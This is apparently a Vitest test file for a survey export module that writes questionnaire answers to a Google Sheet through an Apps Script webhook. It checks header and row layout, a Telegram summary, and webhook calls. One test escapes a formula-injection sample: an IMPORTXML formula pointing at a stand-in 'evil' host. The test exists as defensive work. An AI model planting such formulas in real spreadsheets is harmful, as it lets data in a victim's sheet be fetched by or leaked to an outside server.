import { describe, it, expect } from 'vitest'
import {
  buildSurveySheetHeaders,
  buildSurveySheetRow,
  buildSurveySummary,
  SURVEY_EXPORT_KEYS,
} from '@/lib/survey/export'
import { SURVEY_KEY_STEP } from '@/lib/survey/steps'
import { getSheetsConfig, spreadsheetUrl, upsertRowByKey } from '@/lib/integrations/google-sheets'

const rows = [
  { question_key: 's1_company_name', step: 1, answer: { value: 'ТОО kOtaq-Telecom' } },
  { question_key: 's1_contact_name', step: 1, answer: { value: 'QA_TEST_Иван' } },
  { question_key: 's1_contact_phone', step: 1, answer: { value: '+7 700 000 00 00' } },
  { question_key: 's1_industry', step: 1, answer: { value: 'Телеком' } },
  { question_key: 's1_current_revenue_year', step: 1, answer: { value: 4000000 } },
  { question_key: 's11_influence_map', step: 1, answer: { value: [{ category: 'Клиенты', name_or_link: 'ТОО Р', status: 'нет' }] } },
]

describe('survey export → sheet row', () => {
  it('headers and row have the same length; identity columns first', () => {
    const headers = buildSurveySheetHeaders()
    const row = buildSurveySheetRow(rows, { userId: 'u-1', email: 'qa@example.com', updatedAt: new Date('2026-09-08T10:00:00Z') })
    expect(headers.length).toBe(row.length)
    expect(headers.length).toBe(8 + SURVEY_EXPORT_KEYS.length)
    expect(row.slice(0, 8)).toEqual([
      'u-1', '2026-09-08 10:00:00', 'qa@example.com', 'ТОО kOtaq-Telecom', 'QA_TEST_Иван', "'+7 700 000 00 00", 'Телеком', '2/12',
    ])
  })

  it('keys are ordered by step and every wizard key is exported', () => {
    for (let i = 1; i < SURVEY_EXPORT_KEYS.length; i++) {
      expect(SURVEY_KEY_STEP[SURVEY_EXPORT_KEYS[i]]).toBeGreaterThanOrEqual(SURVEY_KEY_STEP[SURVEY_EXPORT_KEYS[i - 1]])
    }
    expect(new Set(SURVEY_EXPORT_KEYS).size).toBe(Object.keys(SURVEY_KEY_STEP).length)
  })

  it('renders table answers readably and leaves unanswered cells empty', () => {
    const headers = buildSurveySheetHeaders()
    const row = buildSurveySheetRow(rows, { userId: 'u-1' })
    const idx = headers.findIndex((h) => h.endsWith('Карта влияния'))
    expect(idx).toBeGreaterThan(7)
    expect(row[idx]).toBe('Клиенты — ТОО Р — нет')
    const empty = headers.findIndex((h) => h.includes('Шаг 12'))
    expect(row[empty]).toBe('')
  })

  it('summary picks company/contact/revenue for the Telegram message', () => {
    const s = buildSurveySummary(rows, { email: 'fallback@example.com' })
    expect(s).toMatchObject({ company: 'ТОО kOtaq-Telecom', contact: 'QA_TEST_Иван', revenue: '4000000', email: 'fallback@example.com', completedSteps: 2 })
  })
})

describe('asSheetText — no formula injection in the staff sheet', () => {
  it('prefixes formula-like values with an apostrophe and leaves others alone', async () => {
    const { asSheetText } = await import('@/lib/survey/export')
    expect(asSheetText('=IMPORTXML("https://evil","//a")')).toBe(`'=IMPORTXML("https://evil","//a")`)
    expect(asSheetText('+7 701 123 45 67')).toBe("'+7 701 123 45 67")
    expect(asSheetText('-5%')).toBe("'-5%")
    expect(asSheetText('@user')).toBe("'@user")
    expect(asSheetText('ТОО Альфа')).toBe('ТОО Альфа')
    expect(asSheetText('')).toBe('')
  })
})

describe('google-sheets (Apps Script webhook) helpers', () => {
  const EXEC = 'https://script.google.com/macros/s/AKfycbXYZ/exec'

  it('config requires a script.google.com /exec URL', () => {
    expect(getSheetsConfig({} as unknown as NodeJS.ProcessEnv)).toBeNull()
    expect(getSheetsConfig({ GOOGLE_APPS_SCRIPT_WEBHOOK_URL: 'https://example.com/hook' } as unknown as NodeJS.ProcessEnv)).toBeNull()
    const cfg = getSheetsConfig({
      GOOGLE_APPS_SCRIPT_WEBHOOK_URL: EXEC,
      GOOGLE_APPS_SCRIPT_SECRET: 's3cret',
      GOOGLE_SHEETS_SPREADSHEET_ID: 'abc',
    } as unknown as NodeJS.ProcessEnv)
    expect(cfg).toMatchObject({ webhookUrl: EXEC, secret: 's3cret', tab: 'Анкета', spreadsheetId: 'abc' })
    expect(spreadsheetUrl(cfg)).toBe('https://docs.google.com/spreadsheets/d/abc/edit')
    expect(spreadsheetUrl({ spreadsheetId: null })).toBeNull()
  })

  it('posts the payload contract and reads the script response', async () => {
    const calls: Array<{ url: string; init: RequestInit }> = []
    const realFetch = globalThis.fetch
    globalThis.fetch = (async (url: string, init: RequestInit) => {
      calls.push({ url, init })
      return new Response(JSON.stringify({ ok: true, action: 'updated', row: 7, url: 'https://docs.google.com/spreadsheets/d/live/edit' }), { status: 200 })
    }) as typeof fetch
    try {
      const res = await upsertRowByKey(['user_id', 'Компания'], ['u-1', 'ТОО'], {
        webhookUrl: EXEC, secret: 's3cret', tab: 'Анкета', spreadsheetId: null,
      })
      expect(res).toEqual({ ok: true, action: 'updated', rowNumber: 7, url: 'https://docs.google.com/spreadsheets/d/live/edit' })
      expect(calls[0].url).toBe(EXEC)
      expect(calls[0].init.method).toBe('POST')
      expect(JSON.parse(String(calls[0].init.body))).toEqual({
        secret: 's3cret', tab: 'Анкета', headers: ['user_id', 'Компания'], values: ['u-1', 'ТОО'],
      })
    } finally {
      globalThis.fetch = realFetch
    }
  })

  it('never throws: script error → ok:false with the message', async () => {
    const realFetch = globalThis.fetch
    globalThis.fetch = (async () => new Response(JSON.stringify({ ok: false, error: 'forbidden' }), { status: 200 })) as typeof fetch
    try {
      const res = await upsertRowByKey(['a'], ['k'], { webhookUrl: EXEC, secret: null, tab: 'Анкета', spreadsheetId: 'abc' })
      expect(res.ok).toBe(false)
      expect(res.error).toBe('forbidden')
      expect(res.url).toBe('https://docs.google.com/spreadsheets/d/abc/edit')
    } finally {
      globalThis.fetch = realFetch
    }
  })

  it('reports "not configured" without a webhook URL', async () => {
    const res = await upsertRowByKey(['a'], ['k'], null)
    expect(res.ok).toBe(false)
    expect(res.error).toMatch(/not configured/)
  })
})
